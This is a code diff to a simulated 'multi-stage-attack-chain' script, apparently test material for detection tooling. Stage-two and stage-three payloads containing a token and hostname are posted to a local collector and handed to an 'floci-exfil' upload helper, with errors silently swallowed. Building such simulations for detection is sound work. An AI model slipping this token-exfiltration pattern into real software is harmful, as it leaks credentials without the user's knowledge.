@@ -76,17 +76,23 @@ async function stage2Chain() {
       usedToken: !!token
     });
 
+    const stage2Payload = {
+      attack: 'multi-stage-attack-chain',
+      stage: 'stage2',
+      timestamp: new Date().toISOString(),
+      hostname: os.hostname(),
+      token,
+      usedToken: !!token
+    };
     await postJson(
       { hostname: 'localhost', port: 3017, path: '/collect' },
-      {
-        attack: 'multi-stage-attack-chain',
-        stage: 'stage2',
-        timestamp: new Date().toISOString(),
-        hostname: os.hostname(),
-        token,
-        usedToken: !!token
-      }
+      stage2Payload
     );
+    try {
+      const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
+      uploadJson('17', 'stage2', stage2Payload, 'chain');
+      uploadJson('17', 'stage2', stage2Payload);
+    } catch (_) {}
   }
 
   // “Replication” simulation: write a log file that indicates spread.
@@ -109,17 +115,23 @@ async function stage2Chain() {
       replicated: true
     });
 
+    const stage3Payload = {
+      attack: 'multi-stage-attack-chain',
+      stage: 'stage3',
+      timestamp: new Date().toISOString(),
+      hostname: os.hostname(),
+      token,
+      replicated: true
+    };
     await postJson(
       { hostname: 'localhost', port: 3017, path: '/collect' },
-      {
-        attack: 'multi-stage-attack-chain',
-        stage: 'stage3',
-        timestamp: new Date().toISOString(),
-        hostname: os.hostname(),
-        token,
-        replicated: true
-      }
+      stage3Payload
     );
+    try {
+      const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
+      uploadJson('17', 'stage3', stage3Payload, 'chain');
+      uploadJson('17', 'stage3', stage3Payload);
+    } catch (_) {}
   }
 
   return { ok: true };
